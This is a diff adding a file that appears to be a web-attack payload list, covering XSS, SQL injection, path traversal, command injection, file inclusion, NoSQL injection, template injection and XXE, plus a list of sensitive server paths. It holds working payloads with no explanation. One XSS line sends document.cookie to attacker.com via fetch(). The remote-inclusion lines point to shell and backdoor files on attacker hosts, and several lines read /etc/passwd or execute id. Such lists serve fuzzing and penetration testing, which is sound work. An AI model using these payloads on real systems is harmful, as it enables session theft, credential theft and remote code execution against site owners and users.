@@ -1,0 +1,62 @@
+# XSS Vectors
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+javascript:alert(document.cookie)
+'><script>fetch('http://attacker.com?c='+document.cookie)</script>
+
+# SQL Injection
+' OR '1'='1' --
+' UNION SELECT username,password FROM users --
+' WAITFOR DELAY '0:0:10' --
+') OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a
+
+# Path Traversal
+../../../etc/passwd%00
+..\..\..\..\windows\win.ini
+....//....//....//etc/passwd
+%252e%252e%252f/etc/passwd
+
+# Command Injection
+; cat /etc/passwd
+| net user
+`whoami`
+$(id)
+
+# Local File Inclusion
+/etc/passwd
+C:\Windows\System32\drivers\etc\hosts
+php://filter/convert.base64-encode/resource=index.php
+data:;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+
+# Remote File Inclusion
+http://evil.com/shell.php
+https://attacker.com/backdoor.php?cmd=
+ftp://attacker.com/exec.php
+
+# NoSQL Injection
+{"$gt": ""}
+{"$where": "sleep(5000)"}
+{"$regex": "^admin"}
+{"password": {"$ne": null}}
+
+# Server-Side Template Injection
+${7*7}
+#{7*7}
+<%= system('id') %>
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# XML Injection
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<![CDATA[<script>alert('XSS')</script>]]>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+
+# Common Sensitive Paths
+.git/config
+.env
+wp-config.php
+config.php
+.htaccess
+/backup
+/admin
+/phpinfo.php
+/server-status
